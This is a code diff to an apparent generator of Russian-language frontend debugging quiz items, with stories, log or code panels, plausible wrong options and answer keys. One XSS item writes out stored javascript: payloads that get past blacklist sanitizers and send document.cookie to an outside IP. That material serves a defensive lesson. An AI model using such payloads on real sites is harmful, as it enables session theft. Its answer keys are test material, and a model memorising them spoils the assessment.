@@ -39,7 +39,7 @@ def _(rng):
     ]
     opts, key = _choice(rng, "Дата форматируется в часовом поясе процесса, а у сервера и браузера он разный: задать timeZone явно", [
         "CDN отдал закэшированный HTML от прошлой выкладки, поэтому время в серверной разметке устарело",
-        "Сервер рендеринга и браузер используют разные версии React",
+        "Сервер рендеринга и браузер используют разные версии React: серверный бандл собран со старым lock-файлом — пересобрать с общим",
         f"У элементов списка в {comp} неуникальные key, и React перепутал узлы при гидрации",
     ])
     return {"scene_title": "Мерцающая дата", "story": f"Пользователи из {city} жалуются: время доставки на секунду показывается одно, потом меняется. В консоли — ошибка гидрации.",
@@ -119,7 +119,7 @@ def _(rng):
         {"name": "долгих задач за сессию", "axis": "right", "max": 40, "data": longt},
     ]}
     opts, key = _choice(rng, "Сначала отрисовать отклик на клик, а сортировку дробить с уступкой потоку или увести в Web Worker", [
-        "Обернуть обработчик клика в requestAnimationFrame: работа уйдёт с главного потока",
+        "Обернуть обработчик клика в requestAnimationFrame: тяжёлая работа уйдёт с главного потока в отдельный кадр и не заблокирует ввод",
         "Поставить debounce 300 мс на кнопку «Применить», чтобы не было лишних кликов",
         "Включить will-change: transform для таблицы, чтобы браузер рендерил её на GPU",
     ])
@@ -226,7 +226,7 @@ def _(rng):
     opts, key = _choice(rng, f"В хосте и в {mf} объявить react и react-dom общими singleton-зависимостями с совместимым диапазоном версий", [
         f"Переписать {widget} на классовые компоненты: им хуки не нужны",
         "Включить React.StrictMode в хосте, чтобы найти побочные эффекты при рендере",
-        f"Обновить в хосте только react-dom до {mf_v}, а react оставить прежним",
+        f"Обновить в хосте только react-dom до {mf_v}, а react оставить прежним: рендерер должен совпадать с версией виджета, остальное совместимо",
     ])
     return {"scene_title": "Чужой виджет", "story": f"Микрофронтенд {mf} соседней команды подключили к хосту через Module Federation. По отдельности оба работают, вместе {widget} падает.",
             "prompt": "Что исправить?", "panel": {"type": "logs", "lines": lines}, "options": opts, "key": key}
@@ -256,7 +256,7 @@ def _(rng):
              '  <button class="btn">Да</button>', '  <button class="btn ghost">Отмена</button>', "</div>"]
     opts, key = _choice(rng, "<dialog>.showModal() или вручную: фокус в окно, ловушка фокуса, Esc и возврат фокуса на кнопку", [
         "Поднять z-index окна выше всех элементов страницы, тогда Tab не уйдёт под него",
-        "Добавить окну role=\"alert\": скринридер сам переведёт туда фокус и удержит его в окне",
+        "Добавить окну role=\"alert\" и aria-modal=\"true\": скринридер сам переведёт туда фокус, а браузер удержит Tab внутри окна",
         "Сделать подложку непрозрачной, чтобы страница под окном не отвлекала",
     ])
     return {"scene_title": "Окно с клавиатуры", "story": f"Окно «{title}» открывается по кнопке. С клавиатуры фокус остаётся на странице под окном, Tab ходит по ссылкам за подложкой, Esc ничего не делает.",
@@ -334,7 +334,8 @@ def _(rng):
 
 @family("fe_arch_cdn_personal", "Frontend", "Архитектура клиента", "choice", 2.3, 2.4)
 def _(rng):
-    page, who, n = rng.choice([("/catalog", "имя пользователя", 7), ("/", "чужая корзина", 4), ("/orders", "чужой номер телефона", 11)])
+    page, who, seen, n = rng.choice([("/catalog", "чужое имя пользователя", "видно", 7), ("/", "чужая корзина", "видна", 4),
+                                     ("/orders", "чужой номер телефона", "виден", 11)])
     ttl = rng.choice([60, 120, 300])
     lines = [
         _log("10:41:02", "cdn-edge", "INFO", f"GET {page} 200 x-cache: HIT age={rng.randint(5, ttl - 1)}"),
@@ -345,7 +346,7 @@ def _(rng):
     ]
     opts, key = _choice(rng, "Каркас — в кэш CDN, персональный блок — отдельным запросом с Cache-Control: private", [
         "Добавить Vary: Cookie — CDN будет хранить отдельную копию страницы для каждого пользователя",
-        f"Снизить s-maxage до 5 секунд: окно, в котором видна {who}, станет пренебрежимым",
+        f"Снизить s-maxage до 5 секунд: окно, в котором {seen} {who}, станет пренебрежимым",
         rng.choice(["Выключить потоковый SSR: при стриминге ответы разных запросов смешиваются",
                     "Выключить потоковый SSR"]),
     ])
@@ -364,7 +365,8 @@ def _(rng):
     key = len(lines)
     lines += ["      if (!r.ok) throw new Error(`HTTP ${r.status}`);", "      return r.json();", "    }));", "  }", "  return cache.get(key)!;", "}"]
     m = rng.randint(2, 6)
-    return {"scene_title": "Вечная ошибка", "story": f"Сервис {api} лежал {m} минуты и отвечал 503. Он давно поднялся, но для части ключей {fn} до перезагрузки вкладки возвращает ошибку.",
+    mins = "минуты" if m < 5 else "минут"
+    return {"scene_title": "Вечная ошибка", "story": f"Сервис {api} лежал {m} {mins} и отвечал 503. Он давно поднялся, но для части ключей {fn} до перезагрузки вкладки возвращает ошибку.",
             "prompt": "Нажмите на строку с причиной.", "panel": {"type": "code", "lang": "ts", "lines": lines, "caption": f"PR #{rng.randint(500, 999)} · «дедупликация {fn}»"}, "key": key}
 
 
@@ -372,15 +374,24 @@ def _(rng):
 def _(rng):
     field, role = rng.choice([("website", "модератора"), ("portfolio", "рекрутера"), ("homepage", "администратора")])
     host = f"203.0.113.{rng.randint(2, 250)}"
+    # санитайзер по чёрному списку и обход, который он пропускает: таб внутри схемы, регистр, управляющий символ в начале
+    check, payload, patch = rng.choice([
+        ('raw.trim().toLowerCase().startsWith("javascript:")', "java\\tscript:",
+         "Заменить trim() на replace(/\\s+/g, \"\") — других способов записать javascript: с пропуском проверки нет"),
+        ('raw.replace(/\\s+/g, "").startsWith("javascript:")', "JavaScript:",
+         "Добавить toLowerCase() перед startsWith — после этого чёрный список закрывает схему javascript: полностью"),
+        ('/^javascript:/i.test(raw.replace(/\\s+/g, ""))', "\\x01javascript:",
+         "Регулярка без флага m не видит перевод строки: добавить флаг m, и проверка станет надёжной"),
+    ])
     lines = ["function safeHref(raw: string): string {",
-             '  if (raw.trim().toLowerCase().startsWith("javascript:")) return "#";',
+             f'  if ({check}) return "#";',
              "  return raw;",
              "}",
              "",
              f'<a href={{safeHref(profile.{field})}} target="_blank" rel="noopener">Сайт</a>',
-             f'// в базе: profile.{field} = "java\\tscript:fetch(\'//{host}/?c=\'+document.cookie)"']
-    opts, key = _choice(rng, "Парсер URL выкидывает табы внутри схемы: нужен белый список протоколов по new URL(raw).protocol", [
-        "trim() убирает пробелы только по краям — достаточно заменить его на replace(/\\s+/g, \"\") перед проверкой",
+             f'// в базе: profile.{field} = "{payload}fetch(\'//{host}/?c=\'+document.cookie)"']
+    opts, key = _choice(rng, "Чёрный список обходится нормализацией URL: пускать только http/https по new URL(raw).protocol", [
+        patch,
         "Без noreferrer ссылка с target=_blank исполняется в контексте страницы — добавить rel=\"noopener noreferrer\"",
         rng.choice(["React экранирует атрибуты, значит код пришёл через dangerouslySetInnerHTML в другом компоненте",
                     "React экранирует атрибуты: ищите dangerouslySetInnerHTML"]),
@@ -389,10 +400,15 @@ def _(rng):
             "prompt": "Почему защита не сработала и как исправить надёжно?", "panel": {"type": "code", "lang": "tsx", "lines": lines}, "options": opts, "key": key}
 
 
-@family("fe_perf_leak", "Frontend", "Производительность", "choice", 2.4, 2.9)
+@family("fe_perf_leak", "Frontend", "Производительность", "choice", 2.4, 2.5)
 def _(rng):
     a, b = rng.choice([("Заказы", "Отчёты"), ("Сделки", "Аналитика"), ("Задачи", "Календарь")])
-    sub = rng.choice(["ResizeObserver", "window.addEventListener(\"resize\")", "подписка на общую шину событий"])
+    # подписка, которую не снимают, и косвенная улика: число слушателей растёт с каждым переключением вкладок
+    sub, clue = rng.choice([
+        ("ResizeObserver", "в Performance monitor число активных ResizeObserver растёт на один при каждом переключении"),
+        ('Обработчик window.addEventListener("resize")', "getEventListeners(window).resize в консоли растёт на один при каждом переключении"),
+        ("Подписка на общую шину событий", "bus.listenerCount(\"update\") растёт на один при каждом переключении"),
+    ])
     x = [f"{5 * i} мин" for i in range(8)]
     heap = [round(60 + i * rng.uniform(38, 46)) for i in range(8)]
     inp = [rng.randint(90, 130) + i * rng.randint(45, 60) for i in range(8)]
@@ -401,11 +417,12 @@ def _(rng):
         {"name": "INP p75, мс", "axis": "right", "max": 600, "data": inp},
     ]}
     detached = rng.randint(8, 30) * 1000
-    opts, key = _choice(rng, f"{sub[0].upper() + sub[1:]} не снимается в cleanup и держит отсоединённые узлы", [
+    opts, key = _choice(rng, f"{sub} не снимается в cleanup эффекта и держит отсоединённые узлы", [
         f"Таблица во вкладке «{b}» не виртуализирована: тысячи узлов делают каждый кадр тяжёлым — виртуализировать",
-        "GC не успевает между long tasks: дробить работу через scheduler.yield, чтобы дать сборщику время",
-        rng.choice(["Это расширения браузера у части пользователей: в чистом профиле утечки нет",
-                    "Это расширения браузера: в чистом профиле Chrome проблема не воспроизводится, и чинить в коде нечего"]),
+        "Кэш запросов хранит данные всех открытых вкладок: уменьшить gcTime — куча перестанет расти",
+        rng.choice(["Detached-узлы держит React DevTools у операторов: в проде без расширения утечки нет",
+                    "GC не успевает между long tasks: дробить работу через scheduler.yield, чтобы дать сборщику время"]),
     ])
-    return {"scene_title": "Тормозит к обеду", "story": f"Операторы весь день переключают вкладки «{a}» ↔ «{b}». Через полчаса интерфейс вязнет; в снимке кучи — {detached} Detached HTMLDivElement.",
+    return {"scene_title": "Тормозит к обеду", "story": f"Операторы весь день переключают вкладки «{a}» ↔ «{b}». Через полчаса интерфейс вязнет; "
+                                                      f"в снимке кучи — {detached} Detached HTMLDivElement, {clue}.",
             "prompt": "В чём причина?", "panel": panel, "options": opts, "key": key}
